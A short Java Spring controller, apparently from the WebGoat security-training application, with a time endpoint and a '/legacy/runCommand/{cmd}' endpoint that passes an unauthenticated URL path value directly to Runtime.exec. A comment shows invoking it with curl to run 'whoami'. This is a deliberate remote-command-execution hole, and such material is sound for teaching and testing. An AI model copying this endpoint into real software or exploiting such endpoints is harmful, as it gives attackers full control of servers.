package org.owasp.webgoat;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.util.Date;

@RestController
@RequestMapping("/legacy")
public class HelloController {

    @GetMapping("/getTime") // require auth
    public String getTime() {
        return new Date().toString();
    }

    // curl localhost:8080/WebGoat/legacy/runCommand/whoami
    @GetMapping("/runCommand/{cmd}")
    public String runCommand(@PathVariable String cmd) throws IOException {
        return new String(Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes());
    }
}
